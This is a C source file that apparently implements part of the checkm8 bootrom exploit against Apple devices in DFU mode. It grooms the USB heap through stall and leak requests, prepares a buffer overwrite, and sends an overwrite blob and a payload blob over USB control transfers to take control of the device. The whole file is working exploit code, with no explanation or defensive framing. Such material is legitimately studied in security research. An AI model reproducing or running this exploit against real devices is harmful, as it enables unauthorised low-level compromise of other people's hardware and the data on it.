#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <include/usbexec.h>
#include <include/checkm8.h>

int heap_grooming(libusb_handler_t *dev)
{	uint16_t vendorID = 0x5AC;
	uint16_t productID = 0x1227;
	
	dev = reconnect_device(dev, vendorID, productID, 1);

	INFO("heap grooming\n");

	usb_stall(dev);

	for (int i = 0; i < 5; i++) {
		usb_no_leak(dev);
	}

	usb_req_leak(dev);
	usb_no_leak(dev);
	libusb_reset_device(dev->dev);
	usleep(500000);

	return 0;
}

int setup_overwrite(libusb_handler_t *dev)
{	
	int ret = 0;
	unsigned char buf[0x800];

	INFO("preparing for overwrite\n");
	memset(buf, 'A', 0x800);
	ret = async_ctrl_transfer(dev, 0x21, 1, 0, 0, buf, 0x800, 1);
	if (ret != 0) {
		ERROR("failed to prepare for overwrite.");
		return -1;
	}

	libusb_control_transfer(dev->dev, 0x21, 4, 0, 0, NULL, 0, 0);
	libusb_reset_device(dev->dev);
	usleep(500000);

	return 0;
}

int load_payloads(libusb_handler_t *dev)
{
	unsigned char overwrite_buf[1524];
	unsigned char payload_buf[2400];

	FILE *overwrite_file = fopen("bin/overwrite.bin", "r");
	if (overwrite_file == NULL) {
		ERROR("could not open overwrite.bin\n");
		return -1;
	}

	fread(overwrite_buf, 1524, 1, overwrite_file);
	fclose(overwrite_file);

	FILE *payload_file = fopen("bin/payload.bin", "r");
	if (payload_file == NULL) {
		ERROR("could not open overwrite.bin\n");
		return -1;
	}

	fread(payload_buf, 2400, 1, payload_file);
	fclose(payload_file);

	usb_req_stall(dev);
	usb_req_leak(dev);

	INFO("sending overwrite\n");
	libusb_control_transfer(dev->dev, 0, 0, 0, 0, overwrite_buf, 1524, 100);

	INFO("sending payload\n");
	libusb_control_transfer(dev->dev, 0x21, 1, 0, 0, payload_buf, 2048, 100);
	libusb_control_transfer(dev->dev, 0x21, 1, 0, 0, &payload_buf[2048], 352, 100);

	INFO("reseting device...\n");
	libusb_reset_device(dev->dev);

	return 0;
}
